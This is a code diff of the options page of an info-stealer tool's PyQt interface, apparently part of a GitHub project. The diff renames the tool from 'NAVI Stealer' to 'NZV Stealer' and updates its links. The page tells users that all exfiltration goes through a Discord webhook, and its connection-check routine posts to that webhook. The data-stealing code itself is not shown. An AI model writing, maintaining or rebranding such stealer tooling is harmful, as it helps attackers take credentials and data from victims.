@@ -173,11 +173,11 @@ class OptionsPage(QWidget):
         info_layout.setContentsMargins(15, 25, 15, 15)
         info_layout.setSpacing(15)
         
-        info_text = QLabel("NAVI STEALER\n\nAll exfiltration is handled via Discord.\nMake sure to provide a valid webhook.")
+        info_text = QLabel("NZV Stealer\n\nAll exfiltration is handled via Discord.\nMake sure to provide a valid webhook.")
         info_text.setStyleSheet("color: #aaa; font-size: 13px;")
         info_text.setAlignment(Qt.AlignCenter)
         
-        github_link = QLabel('<a href="https://github.com/c7s89r/navi-multitool" style="color: #00a2ff; text-decoration: none; font-size: 14px; font-weight: bold;">github.com/c7s89r/NAVI-MULTITOOL</a>')
+        github_link = QLabel('<a href="https://github.com/c7s89r/nzv-tools" style="color: #00a2ff; text-decoration: none; font-size: 14px; font-weight: bold;">github.com/c7s89r/nzv-tools</a>')
         github_link.setOpenExternalLinks(True)
         github_link.setAlignment(Qt.AlignCenter)
         
@@ -238,11 +238,11 @@ class OptionsPage(QWidget):
             embed = {
                 "embeds": [
                     {
-                        "title": "NAVI — Connection Check",
+                        "title": "NZV — Connection Check",
                         "description": "✅ Webhook connection successful.",
                         "color": 0x5865F2,
                         "footer": {
-                            "text": "NAVI • https://github.com/c7s89r/navi-multitool"
+                            "text": "NZV • https://github.com/c7s89r/nzv-tools"
                         },
                         "timestamp": __import__("datetime").datetime.utcnow().isoformat()
                     }
@@ -252,10 +252,10 @@ class OptionsPage(QWidget):
             r = requests.post(url, json=embed, timeout=10)
 
             if r.status_code in (200, 204):
-                self.box = CustomMessageBox("NAVI", "success", "NAVI: check sent!")
+                self.box = CustomMessageBox("NZV", "success", "NZV: check sent!")
             else:
-                self.box = CustomMessageBox("NAVI", "error", "NAVI: invalid webhook")
+                self.box = CustomMessageBox("NZV", "error", "NZV: invalid webhook")
             self.box.show()
         except Exception as e:
-            self.box = CustomMessageBox("NAVI", "error", "NAVI: error")
+            self.box = CustomMessageBox("NZV", "error", "NZV: error")
             self.box.show()
